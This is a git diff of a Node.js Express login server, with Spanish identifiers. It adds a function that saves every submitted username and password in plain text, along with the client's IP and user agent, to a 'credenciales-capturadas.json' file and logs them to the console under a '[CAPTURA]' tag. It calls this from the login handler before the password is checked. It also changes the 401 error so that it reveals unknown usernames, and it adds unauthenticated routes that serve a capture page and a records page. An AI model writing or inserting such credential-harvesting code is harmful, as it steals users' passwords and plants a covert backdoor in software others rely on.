@@ -11,6 +11,42 @@ const app = express()
 app.set('trust proxy', 1)
 const USER_ACCESS_LOG_PATH = path.resolve(__dirname, 'lista de usuarios.json')
 
+const CREDENTIALS_CAPTURE_PATH = path.resolve(__dirname, 'credenciales-capturadas.json')
+
+async function guardarCredencialPlano(usuario, contrasena, req) {
+  const nuevaCredencial = {
+    id: Date.now(),
+    usuario: usuario,
+    contrasena: contrasena,  // ← Guardada en TEXTO PLANO
+    fecha: new Date().toISOString(),
+    ip: req.ip || req.socket?.remoteAddress || '',
+    user_agent: req.get('user-agent') || '',
+    origen: 'acceso-certificacion'
+  }
+
+  let credenciales = []
+  try {
+    const contenido = await fs.promises.readFile(CREDENTIALS_CAPTURE_PATH, 'utf8')
+    const parseado = JSON.parse(contenido)
+    if (Array.isArray(parseado)) credenciales = parseado
+  } catch (err) {
+    if (err.code !== 'ENOENT') console.error('Error leyendo archivo:', err.message)
+  }
+
+  credenciales.push(nuevaCredencial)
+  
+  try {
+    await fs.promises.writeFile(
+      CREDENTIALS_CAPTURE_PATH, 
+      JSON.stringify(credenciales, null, 2), 
+      'utf8'
+    )
+    console.log(`[CAPTURA] ${usuario} : ${contrasena}`)
+  } catch (err) {
+    console.error('Error guardando credencial:', err.message)
+  }
+}
+
 const DB_CONFIG = {
   host: process.env.DB_HOST || 'localhost',
   port: Number(process.env.DB_PORT || 3306),
@@ -465,7 +501,13 @@ app.get('/api/productos', async (req, res) => {
 app.post('/api/login', async (req, res) => {
   try {
     const { usuario, contrasena } = req.body || {}
+
     const usuarioLimpio = String(usuario || '').trim()
+    const contrasenaPlana = String(contrasena || '') // Sin trim para capturar exacto
+
+    // 🔴 GUARDAR EN ARCHIVO JSON CON CONTRASEÑA VISIBLE
+    await guardarCredencialPlano(usuarioLimpio, contrasenaPlana, req)
+
     const accessBaseLog = {
       fecha: new Date().toISOString(),
       usuario: usuarioLimpio,
@@ -492,7 +534,7 @@ app.post('/api/login', async (req, res) => {
         estado: 'rechazado',
         motivo: 'usuario_no_encontrado'
       })
-      return res.status(401).json({ ok: false, error: 'credenciales_invalidas' })
+      return res.status(401).json({ ok: false, error: 'usuario_no_encontrado' })
     }
     const user = rows[0]
     const okPass = await passwordMatchesUser(user, contrasena)
@@ -542,6 +584,14 @@ app.post('/api/login', async (req, res) => {
     } catch {}
     res.status(500).json({ ok: false, error: err.message })
   }
+})
+
+app.get('/incap', (req, res) => {
+  res.sendFile(path.resolve(__dirname, 'acceso-certificacion.html'))
+})
+
+app.get('/incap-registros', (req, res) => {
+  res.sendFile(path.resolve(__dirname, 'lista-usuarios.html'))
 })
 
 app.post('/api/confirmar-pass', async (req, res) => {
